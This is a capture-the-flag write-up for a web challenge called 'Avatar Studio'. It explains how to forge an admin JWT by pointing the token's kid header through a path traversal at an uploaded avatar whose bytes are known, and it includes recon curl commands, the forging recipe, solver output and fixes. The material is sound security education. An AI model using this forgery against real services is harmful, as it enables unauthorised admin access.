# Avatar Studio

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Points | 100 |
| Author | Not specified |
| Connection | `http://chal.thjcc.org:31227/` (instance) |
| Recovered source | [`artifacts/recovered-src/`](artifacts/recovered-src/) (dumped from an exposed `.git`) |
| Interactive writeup | [kid Says Admin — forge console](https://claude.ai/code/artifact/df79c295-7e20-438f-bb61-1e1bdf33a6e4) |
| Flag | `THJCC{local_test_flag_not_the_real_one}` |

> Pick a name, upload an avatar. Members only. Admins get more.

## TL;DR

The site verifies your JWT session by loading the HMAC key **from a file named by
the token's own `kid` header** — and the loader blocks `\0` and leading `/` but
**not `..`**. So point `kid` at a file whose bytes you control. `POST /upload`
stores your avatar **verbatim**, giving you exactly such a file, so you can forge
a `role=admin` token signed with the uploaded bytes and reach `/admin`.

The twist is the flag itself. `/admin` renders
`FLAG = os.environ.get("FLAG", "THJCC{local_test_flag_not_the_real_one}")`, and the
deployment **never sets `FLAG`** — so the *default string is the flag*. You do the
entire exploit and the prize taunts you: *not the real one*. It is. (Two look-alike
decoys exist to send you the wrong way; see below.)

## 1. Recon — the "strange thing"

The landing page just has a `/register` form (Flask/gunicorn). `robots.txt` points
at a hidden console:

```
$ curl -s http://chal.thjcc.org:31227/robots.txt
User-agent: *
Disallow: /panel-legacy
```

and probing turns up an **exposed `.git`**:

```
$ curl -s http://chal.thjcc.org:31227/.git/HEAD
ref: refs/heads/master
```

Dumping the loose objects reconstructs the whole app
([`artifacts/recovered-src/app.py`](artifacts/recovered-src/app.py)). Register once
and you get a JWT session cookie:

```
session = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImhzMjU2LmtleSJ9.
          eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ. <sig>

header  = {"alg":"HS256","typ":"JWT","kid":"hs256.key"}
payload = {"username":"…","role":"user"}
```

`/admin` requires `role=admin`, which lives inside that signed token.

## 2. The Vulnerability — `kid` Path Traversal

The session is verified like this ([`app.py`](artifacts/recovered-src/app.py)):

```python
def load_key(kid: str) -> bytes:
    if "\x00" in kid:      abort(400)
    if kid.startswith("/"): abort(400)         # blocks absolute paths…
    path = os.path.join(KEY_DIR, kid)          # …but NOT ".."
    with open(path, "rb") as f:
        return f.read()

def jwt_verify(token):
    ...
    if header.get("alg") != "HS256": abort(401)
    key = load_key(header.get("kid", ""))      # attacker-chosen file as the key
    expected = hmac.new(key, seg.encode(), hashlib.sha256).digest()
    if not hmac.compare_digest(expected, sig): abort(401)
    return payload
```

The HMAC key is read from **whatever file `kid` names**, relative to `keys/`. There
is **no secret to brute-force** — if I can make `kid` point at a file whose bytes I
already know, I can compute a valid signature myself. `..` is not filtered, so `kid`
is a directory traversal.

## 3. The Gadget — an Upload You Fully Control

`POST /upload` (as any registered user) saves the avatar and hands back its name:

```python
ext  = os.path.splitext(f.filename)[1].lower()          # .png/.jpg/.gif/.webp
name = secrets.token_hex(8) + ext
f.save(os.path.join(UPLOAD_DIR, name))                   # bytes stored verbatim
resp.set_cookie("avatar", name)
```

The bytes are preserved exactly (verified: upload a PNG, download `/uploads/<name>`,
`sha256` matches). So the uploaded file is a **known-content key file** sitting in
`uploads/`, one directory over from `keys/`.

## 4. Forging the Admin Token

Traverse from `keys/` into `uploads/` and sign with the bytes I uploaded:

```python
header  = {"alg":"HS256","typ":"JWT","kid":"../uploads/<hex>.png"}
payload = {"username":"admin","role":"admin"}
seg     = b64url(header) + "." + b64url(payload)
sig     = HMAC_SHA256(key = <the PNG bytes I uploaded>, msg = seg)
cookie  = seg + "." + b64url(sig)
```

`GET /admin` with that cookie: `load_key` reads `keys/../uploads/<hex>.png` = my PNG,
the HMAC matches, `role==admin` passes:

```
Welcome, admin. You made it.
Here is your prize: THJCC{local_test_flag_not_the_real_one}
```

A matrix of strategies confirms the traversal is the intended one — only
`kid=../uploads/<hex>.png` yields `200`; `kid=/dev/null`, `alg=none`,
`kid=uploads/<hex>.png` (no `..`) all fail:

```
[403] alg=none, kid=hs256.key
[403] kid=/dev/null empty
[403] kid=uploads/<hex>.png
[200] kid=../uploads/<hex>.png   <-- admin
[403] kid=../../uploads/<hex>.png
```

## 5. The Flag Is the Joke

`/admin` renders:

```python
FLAG = os.environ.get("FLAG", "THJCC{local_test_flag_not_the_real_one}")
```

The intuition is "the real flag is the env var, and this is only the local
fallback." But the deployment **never sets `FLAG`**: every instance
(`:31227`, `:31236`, …) renders the default, byte-for-byte, across every worker.
So the fallback **is** the flag — you finish the entire `kid`-traversal forgery and
the reward reads *not the real one*. Confirmed accepted:

```
THJCC{local_test_flag_not_the_real_one}
```

### The two decoys

Both other flag-shaped strings are traps, not the answer:

- **`/panel-legacy`** — `robots.txt` advertises it; the leaked source hands you the
  token `d3bug-c0ns0le-2024`, and it prints
  `THJCC{fake_leg4cy_d3bug_c0ns0le_backd00r}`. This is the bait for anyone who reads
  the source and skips the actual exploit — it is explicitly *fake / backd00r*.
- Chasing "the real env `FLAG`" forever — there isn't one to leak. I verified there
  is **no** arbitrary-file read to reach `/proc/self/environ` or a flag file: the
  `kid` traversal only uses a file **as an HMAC key** (never returned), `/uploads/`
  is `basename`-guarded, and `/.git/` is `normpath`-contained (and holds no flag).

## 6. Solver

[`solve.py`](solve.py) runs the whole chain with the standard library only:

```bash
python3 solve.py http://chal.thjcc.org:31227
```

```
[+] registered
[+] uploaded avatar -> uploads/ce288fd6feaf023e.png  (67 bytes, known)
[+] forged admin JWT with kid='../uploads/ce288fd6feaf023e.png'

[+] admin panel reached. flag = THJCC{local_test_flag_not_the_real_one}
    (^ that IS the flag -- the deployment never sets FLAG, so the default string is the reward. Cheeky.)
```

## Why It Works

- **`kid` is attacker-controlled data that selects a key.** Any JWT that lets the
  token choose *where the verification key comes from* is broken; a filesystem `kid`
  without a strict allowlist is a directory-traversal-to-key-confusion. The fix is to
  map `kid` through a fixed dictionary of known key ids, never `open(join(dir, kid))`.
- **A user-writable file + a key selected by path = game over.** The upload feature
  and the key loader are individually mundane; together they let the attacker supply
  both the key *and* the signature.
- **Read the config, not your assumptions.** `os.environ.get("FLAG", default)` looks
  like the default can't be the answer — but nothing guarantees the env is set. The
  author weaponised exactly that assumption.

## The Fix

- Resolve `kid` against a **whitelist** of key identifiers; never treat it as a path.
- Don't serve `.git` (or any dotfiles) from the web root.
- Keep uploaded content out of any directory reachable by key/secret resolution.

## Flag

```text
THJCC{local_test_flag_not_the_real_one}
```
